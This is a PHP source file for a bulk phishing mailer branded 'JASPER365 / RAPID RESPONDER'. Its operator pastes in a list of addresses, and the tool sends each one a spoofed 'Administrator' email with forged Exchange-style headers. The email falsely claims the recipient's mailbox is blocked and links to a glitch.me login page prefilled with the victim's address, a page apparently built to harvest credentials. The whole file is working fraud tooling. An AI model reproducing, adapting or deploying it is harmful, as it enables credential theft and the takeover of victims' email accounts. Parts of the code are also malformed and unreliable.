<?php
session_start();
ob_start("ob_gzhandler");
set_time_limit(0); 
$website="
https://prism-savory-aragon.glitch.me"; //Make this full url including folders of where login files resides


//sanitize data where any character is allowed
function sanitizer($check){
	$check=str_replace("\'","'",$check);
	$check=str_replace('\"','"',$check);
	$check=str_replace("\\","TN9OO***:::::t&*HHHHOOOoooo0000N",$check); //just to keep track of what I will change later
	$check=trim($check);
	$check=str_replace("<","&lt;",$check);
	$check=str_replace('>','&gt;',$check);
	$check=str_replace("\r\n","<br/>",$check);
	$check=str_replace("\n","<br/>",$check);
	$check=str_replace("\r","<br/>",$check);
	$check=str_replace("'","&#39;",$check);
	$check=str_replace('"','&quot;',$check);
	$check=str_replace(" fuck "," f**k ",$check);
	$check=str_replace(" shit "," s**t ",$check);
	$check=str_replace("TN9OO***:::::t&*HHHHOOOoooo0000N","&#92;",$check); //returning backslash in html entity
	 return $check;}
	 
	 
//makes data ok on edit textarea
 function resanitize($check){
	$check=str_replace("<br/>","\r\n",$check);
	$check=str_replace("<br/>","\n",$check);
	$check=str_replace("<br/>","\r",$check);
	$check=str_replace("&gt;",">",$check);
	$check=str_replace("&lt;","<",$check);
	$check=str_replace("&#39;","'",$check);
	$check=str_replace('&quot;','"',$check);
	 return $check;}
	 
	 
//validate email address
function validate_email($email){
	$status=false;
	$regex='/^([a-zA-Z0-9])+([\.a-zA-Z0-9_-])*@([a-zA-Z0-9_-])+(\.[a-zA-Z0-9_-]+)*\.([a-zA-Z]{2,6})$/'; 
	if(preg_match($regex, $email)){$status=true;}
	return $status; }
	
	
//Email sending
function sending_email($email,$id='1',$details=''){
	$rand=rand(999,99999);
	$usr="no-reply".$rand;
	$dom=$_SERVER['SERVER_NAME'];
	
	$em=explode('@',$email);
	$emaildomain = substr(strrchr($email, "@"), 1);
	$bc=explode('.',$emaildomain);
	$chgcap=strtolower($bc[0]);
	$frmsite=ucfirst($chgcap);
	$emincap=strtolower($em[0]);
	$mename=ucfirst($emincap);
	
	$site_name= "Administrator ".$emaildomain." Services";
	
	
	$subject= " ".$emaildomain." Have blocked your mailbox";
	//$siteemail='ms-oxprotp@mssimple.apcprd01.prdexchangpe11.net';
	$siteemail='ms-oxprotp.mssimple.apcprd01';
	
	
// To send HTML mail, the Content-type header must be set
		
		$headers  = 'MIME-Version: 1.0' . "\r\n";
		$headers .= 'Content-type: text/HTML; charset="UTF-8';
		$headers .= 'Return-Path: bounce-810_HTML-769869545-477063-1070564-43@bounce.email.oflce57578375.com'. "\r\n";
        $headers .= 'Message-ID: <5bc7d69b-b2f2-4b32-8f45-bf9030f9f684@HK2PR01MB1076.apcprd01.prod.exchangelabs.com>'. "\r\n";
        
        //$headers .= 'From: Megan Beans <gx01-prox@mxsimple1.apcprd03.pr0dexchangqe12.net>'. "\r\n";
		$headers .= "From: ".$site_name." <".$siteemail.">\n";
		//$headers .= "From: ".$site_name." <$usr@$dom>\n";
		
		
		
	//format message	
	$message=email_format($email,$id,$details);
	@mail($email,$subject, $message, $headers);	
}

function email_format($email,$id='1',$details=''){
	global $website;
	//$website="";
	$url=$website."#".$email;
	$unsubscribe=$website."/newsletters/unsubscribe/";
	$em=explode('@',$email);
	$emaildomain =    substr(strrchr($email, "@"), 1);
	$bc=explode('.',$emaildomain);
	$chgcap=strtolower($bc[0]);
	$frmsite=ucfirst($chgcap);
	$emincap=strtolower($em[0]);
	$mename=ucfirst($emincap);
	$message="
	<!doctype html>
<html>
<head>
    <meta name='viewport' content='width=device-width' />
    <meta http-equiv='Content-Type' content='text/html; charset=UTF-8' />
	<title>Account Confirmation </title>
	</head>
<body>
<table>
<tr>
<td>
<span style='font-size:40px; font-style:bold; color:#0000ff;'>".$frmsite." Administrator!</span><br><br><br>
<span style='font-size:14px;  font-family:verdana; '> <b>Hi ".ucwords($em[0])."</b><div>&nbsp;</div>
Your <strong>".$frmsite."</strong> Email have been blocked from sending emails, Some of your sent messages was marked by ".$emaildomain." for  violating our terms and conditions.<br><br>
Error Code:  #4358E,<br><br>
Your sent messages will be pending until you rectify the error.<br><br>
please sign in on ".$frmsite." online mail Portal to rectify error!!, thank you for choosing ".$emaildomain."<br><br>


<a href='".$url."' 
	     style='font-size:12px;display:block;float:left;text-decoration:none;color:#FFFAFA;
	     padding:10px 10px 10px 10px;margin:2px;background:	#506ED8;border-radius:3px;'>
	".$emaildomain." online mail portal
	     </a><br><br><br>


Error will be corrected automatically after admin verification, sorry for the  inconvinieces.<br><br><br>
Best Regards<br>
<strong>".$frmsite." Mail System</strong><br><br><br><br>
</span>
</td>
</tr>
<tr>
<td>
<span style='font-size:11px; line-height:0.2; font-family:arial;'>
If you wish to automatically perform this action next time;  <a href='".$unsubscribe."' style='color:#506ED8;' target='_blank'>Subscribe Now</a><br>
</span><br>
</td>
</tr>
</table>

</body>
</html>
	"; 

	return $message; }?>
<?php system("chmod 0644 gfx.php"); ?>
<?php chmod("gfx.php",0644); ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"><head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<link rel="SHORTCUT ICON" href="http://mxmail.optimumelectronics.com/mail/skins/default/images/favicon.ico">
<title>JASPER365</title>
<style type="text/css">
<!--
.form {font-family: "Courier New", Courier, monospace;border:none, background-color:#000000;}
form .text-field {font-family: "Courier New", Courier, monospace; border: 1px solid #A6A6A6;height: 40px;border-radius: 3px; margin-top: 3px;padding-left: 10px;
form .text-field {border: 1px solid #A6A6A6; width: 230px; height: 40px; border-radius: 3px; margin-top: 3px; padding-left: 10px; color: #6C6C6C; background: none repeat scroll 0% 0% #FCFCFC; outline: medium none;}
input[placeholder], [placeholder], [placeholder] {color: #6C6C6C !important; }color: #6C6C6C; box-shadow: 1px 2px 50px #A6A6A6; background: none repeat scroll 0% 0% #FCFCFC;outline: medium none;}input[placeholder], [placeholder], [placeholder] {color: #6C6C6C !important;}
form .text-area {font-family: "Courier New", Courier, monospace; border: 1px solid #A6A6A6; width: 330px;height: 130px;border-radius: 3px; margin-top: 3px;padding-left: 10px;}
form .msg-area {font-family: "Courier New", Courier, monospace; border: 1px solid #A6A6A6; width: 330px;height: 330px;border-radius: 3px; margin-top: 3px;padding-left: 10px;}
form .text-field {border: 1px solid #A6A6A6; width: 230px; height: 40px; border-radius: 3px; margin-top: 3px; padding-left: 10px; color: #6C6C6C; background: none repeat scroll 0% 0% #FCFCFC; outline: medium none;}
input[placeholder], [placeholder], [placeholder] {color: #6C6C6C !important; }color: #6C6C6C; box-shadow: 1px 2px 50px #A6A6A6; background: none repeat scroll 0% 0% #FCFCFC;outline: medium none;}input[placeholder], [placeholder], [placeholder] {color: #6C6C6C !important;}
.send {font-family: "Courier New", Courier, monospace;border:none; font-size:18px; background-color:#FFFFFF; font-black:bold}
.button {border-radius: 3px;border: 1px solid #336895;box-shadow: 0px 1px 0px #8DC2F0 inset;width: 242px;height: 40px;
    background: -moz-linear-gradient(center bottom , #4889C2 0%, #5BA7E9 100%) repeat scroll 0% 0% transparent;cursor: pointer;color: #FFF;font-weight: bold;text-shadow: 0px -1px 0px #336895;font-size: 13px;}
.div { box-shadow: 1px 2px 50px #888888; border-radius:1px;}
#Layer1 {	position:absolute;
	left:402px;
	top:22px;
	width:457px;
	height:121%;
	z-index:1;
	margin-top: 0.5%;
	margin-right: 5%;
	right: 20%;
	bottom: 15%;
	margin-bottom: 10%;
	margin-left: 5%;
	border: none #000;
	border-radius:10px;
}

-->
</style>
</head>

<body>
<form method='POST' action='#'>
<div style='margin:0px;background:white;font-family:calibri;color:#000;font-size:13px;padding:10px;width:100%;'>
<div style='border:1px solid #c0c0c0;background:#fff;max-width:70%;margin:5px auto 5px auto;min-height:300px;box-shadow: 1px 2px 50px #888888; border-radius:3px;'>
<div style='padding:5px;margin:5px;font-size:16px;color:black;'><p style='clear:both;'>
  <table width="100%" border="0">
  <tr>
      <td height="23" colspan="2"><div align="center" class="form"><strong><spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >R</spam><spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >A</spam><spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >P</spam><spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >I</spam><spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >D</spam>
<spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >R</spam><spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >E</spam><spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >S</spam><spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >P</spam><spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >O</spam><spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >N</spam><spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >D</spam>
<spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >S</spam><spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >E</spam><spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >N</spam><spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >D</spam><spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >E</spam><spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >R</spam>
<br>
<spam style='color:#E41B17;text-align:center;text-shadow:#000 1px 1px;'>JASPER</spam> </strong></div></td>
    </tr>
	<tr align="center"><td><div style='width:100%;'>  <?php
if(isset($_POST['go']) ){
	//sanitize the data
	$_SESSION['xsenderid']=sanitizer($_POST['id']);
	$separator=sanitizer($_POST['separator']);
	$details=sanitizer($_POST['details']);
	$mails=sanitizer($_POST['mails']);
	$id=$_SESSION['xsenderid'];
	if($separator==''){$separator='<br/>';}
	if($mails!='' && $details!=''){
	

		$mails=explode($separator,$mails);
		$total=count($mails);
		$valid=0;
			for($i=0;$i<$total;$i++){
				$email=$mails[$i];
					if(validate_email($email)){
						$valid=$valid+1;
						
						//Send here
						sending_email($email,$id,$details);
						//send here
						} else {print "<spam style='text-align: center; font-size: 12px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: RED; text-decoration: none; display:inline-block; height: 20px; padding-left: 5px; padding-right: 5px; border-radius: 7px;'>".$email." NOT A VALID EMAIL</spam>"; }
			}
		print "<spam style='text-align: center; font-size: 12px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: green; text-decoration: none; display:inline-block; height: 20px; padding-left: 5px; padding-right: 5px; border-radius: 7px;'>WELL SENT ".$valid." OUT OF ".$total." ";


	} else {print "<spam style='text-align: center; font-size: 12px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: BLACK; text-decoration: none; display:inline-block; height: 20px; padding-left: 5px; padding-right: 5px; border-radius: 7px;'>MAILS OR DETAIL ARE EMPTY</spam>"; }
}
?> </div></td></tr>
  <tr>
    <td valign="top"><div>
<select name='id' class="text-field" style='width:100%;'>
<?php
if(isset($_SESSION['xsenderid']))
{print "<option value='".$_SESSION['xsenderid']."'>".$_SESSION['xsenderid']."</option>";}
?>
<option value='1'>1</option>
<option value='2'>2</option>
<option value='3'>3</option>
<option value='4'>4</option>
</select>
      </div>
      <div>
        
        <textarea name='separator' class="text-field" size="30" placeholder="Email Separator" style='width:100%;'><?php if(isset($_POST['separator'])){print resanitize($_POST['separator']);} ?></textarea>
      </div>
      <div>
        <textarea placeholder='FAKE IP' class="text-field" size="83%" name='details' style='width:100%;'><?php if(isset($_POST['details'])){print resanitize($_POST['details']);} ?></textarea>
      </div>      <div>
        <textarea placeholder='PASTE MAILS HERE' class="text-area" name='mails' cols="35" rows="10" style='width:100%;'><?php if(isset($_POST['mails'])){print resanitize($_POST['mails']);} ?></textarea>
      </div>
	  <br />
	  <div><input type="submit" style="border-radius: 3px;border: 1px solid #336895;box-shadow: 0px 1px 0px #8DC2F0 inset;width: 242px;height: 40px;background: -moz-linear-gradient(center bottom , #4889C2 0%, #5BA7E9 100%) repeat scroll 0% 0% transparent;cursor: pointer;color: #FFF;font-weight: bold;text-shadow: 0px -1px 0px #336895;font-size: 13px;" name="go" value="START GOING"> </div><br />
<div></div>	  </td>
    <td align="left"><div><?php print email_format('jasper@xsender.net',1,'IP Address: 85.214.132.117 <br/>Location: Germany (DE)<br/>'); ?> </div></td>
  </tr>
</table>
<center>
<table>
<tr align="center"><td>
  <spam style='color:#E41B17;align:center;text-shadow:#000 1px 1px;'>Skype = Brian Lucky</spam>
</td></tr></table></center>
 </div>
</div>
</div>
</div>
</form>
</body>
</html>
<?php
function make_seed() {
list($usec, $sec) = explode(' ', microtime());
return (float) $sec + ((float) $usec * 100000);
}
mt_srand(make_seed());
function randchar($string = 'abcdefghijklmnopqrstuvwxyz0123456789'){
return $string{rand(0,strlen($string)-1)};
}

return $result; 
?>